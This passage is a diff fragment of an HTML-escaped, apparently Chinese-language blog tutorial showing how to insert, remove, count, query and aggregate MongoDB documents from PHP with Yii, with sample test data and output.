+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;batchInsert&lt;/span&gt;([  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	  [ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;smith&amp;#39;&lt;/span&gt;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;man&amp;#39;&lt;/span&gt;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;hobby&amp;#39;&lt;/span&gt; =&amp;gt; json_encode([&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sport&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;football&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;music&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;pop&amp;#39;&lt;/span&gt;])  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	  ],  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	  [  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;james&amp;#39;&lt;/span&gt;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;women&amp;#39;&lt;/span&gt;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;hobby&amp;#39;&lt;/span&gt; =&amp;gt; json_encode([&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sport&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;basketball&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;music&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;jazz&amp;#39;&lt;/span&gt;])  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 ] 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$result&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt; =&amp;gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;smith&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;man&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;hobby&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;{\&amp;#34;sport\&amp;#34;:\&amp;#34;football\&amp;#34;,\&amp;#34;music\&amp;#34;:\&amp;#34;pop\&amp;#34;}&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;_id&amp;#39;&lt;/span&gt; =&amp;gt; MongoDB\BSON\ObjectId&lt;span style=&#34;color:#228b22&#34;&gt;#1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        (
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            [oid] =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;62a2cc104e2f0000e70020a1&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt; =&amp;gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;james&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;women&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;hobby&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;{\&amp;#34;sport\&amp;#34;:\&amp;#34;basketball\&amp;#34;,\&amp;#34;music\&amp;#34;:\&amp;#34;jazz\&amp;#34;}&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;_id&amp;#39;&lt;/span&gt; =&amp;gt; MongoDB\BSON\ObjectId&lt;span style=&#34;color:#228b22&#34;&gt;#2
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        (
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            [oid] =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;62a2cc104e2f0000e70020a2&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3-删除一条数据&#34;&gt;3. 删除一条数据&lt;/h3&gt;
+&lt;p&gt;使用remove方法，传入一个关联数组（键值对的形式），数组的内容是删除的条件，返回被删除的记录条数
+代码块：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;remove&lt;/span&gt;([  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;smith&amp;#39;&lt;/span&gt;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;man&amp;#39;&lt;/span&gt;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ]);  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;4获取当前操作的数据库和集合&#34;&gt;4.获取当前操作的数据库和集合&lt;/h3&gt;
+&lt;p&gt;使用getFullName方法，获取到的是“数据库.集合”这种格式的字符串。
+代码块：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getFullName&lt;/span&gt;();  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;); &lt;span style=&#34;color:#228b22&#34;&gt;// &amp;#39;test.test&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;5删除集合的所有索引&#34;&gt;5.删除集合的所有索引&lt;/h3&gt;
+&lt;p&gt;使用dropAllIndexes方法，返回删除的索引总数。
+代码块：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;dropAllIndexes&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;); &lt;span style=&#34;color:#228b22&#34;&gt;// 1  
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;6检查某个条件的文档是否存在&#34;&gt;6.检查某个条件的文档是否存在&lt;/h3&gt;
+&lt;p&gt;使用documentExists方法，传入条件类型为关联数组，返回布尔值。
+代码块：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;documentExists&lt;/span&gt;([&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mike&amp;#39;&lt;/span&gt;]);  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;); &lt;span style=&#34;color:#228b22&#34;&gt;// true or false
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;7获取某个条件下文档的总数&#34;&gt;7.获取某个条件下文档的总数&lt;/h3&gt;
+&lt;p&gt;使用count方法，传入条件类型为关联数组，返回整型。
+代码块：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;count&lt;/span&gt;([&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mike&amp;#39;&lt;/span&gt;]);  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;); &lt;span style=&#34;color:#228b22&#34;&gt;// 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;8获取指定字段不重复的值&#34;&gt;8.获取指定字段不重复的值&lt;/h3&gt;
+&lt;p&gt;使用distinct，第一个参数为指定的字段（类型为字符串），第二个参数为筛选的条件（类型为数组），如果存在返回数据（类型为数组），没有的话为false。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;distinct&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;,[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;sex&amp;#34;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;M&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;age&amp;#34;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#b452cd&#34;&gt;21&lt;/span&gt;]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dd(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;);  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-15_15-09-26.jpg&#34; alt=&#34;Navicat查询结果&#34;&gt;
+&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-15_15-09-36.jpg&#34; alt=&#34;函数查询结果&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;9使用聚合函数aggregate进行复杂查询&#34;&gt;9.使用聚合函数（aggregate）进行复杂查询&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;MongoDB 中聚合(aggregate)主要用于处理数据(诸如统计平均值，求和等)，并返回计算后的数据结果。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;为了后面筛选数据结果比对明显，所以先添加测试数据，指令如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;db.user.drop();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(var &lt;span style=&#34;color:#00688b&#34;&gt;i&lt;/span&gt;=10; i&amp;lt; 100; i++) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  db.user.insert({
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    name:&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt; + i, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    age : Math.floor(Math.random()*10)+ 20, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sex : Math.floor(Math.random()*3)%2 ==&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt; ? &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt; : &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;F&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    chinese : Math.floor(Math.random()*50)+50,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    math : Math.floor(Math.random()*50)+50,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    english : Math.floor(Math.random()*50)+50,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    class : &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt; + i%5
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  })
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该指令添加了100条数据，数据内容包括用户名，年龄，性别，语文、数学、英语成绩还有所在班级；
+&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-15_15-09-26.jpg&#34; alt=&#34;数据内容&#34;&gt;&lt;/p&gt;
+&lt;p&gt;aggregate，该方法需要传递一个二维的索引数组，第二维为关联数组，数组的键为mongoDB表达式，值为条件内容。&lt;/p&gt;
+&lt;h4 id=&#34;91-用聚合来筛选性别为m的文档&#34;&gt;9.1 用聚合来筛选性别为“M”的文档&lt;/h4&gt;
+&lt;p&gt;这里需要使用到聚合表达式的&lt;code&gt;$match&lt;/code&gt;，其功能如同MySQL的where，代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$aggregate&lt;/span&gt; = [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$match&amp;#39;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt;=&amp;gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$regex&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;M&amp;#34;&lt;/span&gt;]]]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;aggregate&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$aggregate&lt;/span&gt;);
